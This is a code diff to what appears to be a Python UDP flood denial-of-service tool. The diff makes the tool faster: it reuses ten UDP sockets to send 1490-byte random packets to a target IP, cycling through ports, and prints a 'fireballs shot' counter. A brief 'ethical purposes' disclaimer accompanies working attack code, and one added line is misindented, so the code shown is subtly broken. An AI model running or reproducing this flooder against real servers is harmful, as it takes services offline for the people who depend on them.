@@ -120,20 +120,25 @@ while True:
         print
         print(Fore.MAGENTA + "SHOOTING FIREBALLS!. We hope you are using this for ethical purposes. Type Ctrl+C to suspend the attack.")
         time.sleep(2)
+                socks = []
+        for i in range(10):
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            socks.append(sock)
         sent = 0
         try:
             while True:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                 bytes = random._urandom(1490)
-                sock.sendto(bytes, (server_ip, port))
-                sent = sent + 1
-                port = port + 1
-                print(Fore.RED + "Fireball %s shot to %s through port:%s" % (sent, server_ip, port))
-                if port == 65534:
-                    port = 1
+                for sock in socks:
+                       sock.sendto(bytes, (server_ip, port))
+                       sent = sent + 1
+                       port = port + 1
+                       if port == 65534:
+                           port = 1
+                sys.stdout.write(Fore.RED + "Fireball %s shot to %s through port:%s\n" % (sent, server_ip, port))
+                sys.stdout.flush()
         except KeyboardInterrupt:
             raw_input("\nAttack suspended. Press Enter to return to the menu...")
-
+         
     if x == "2":
         os.system("clear")
 
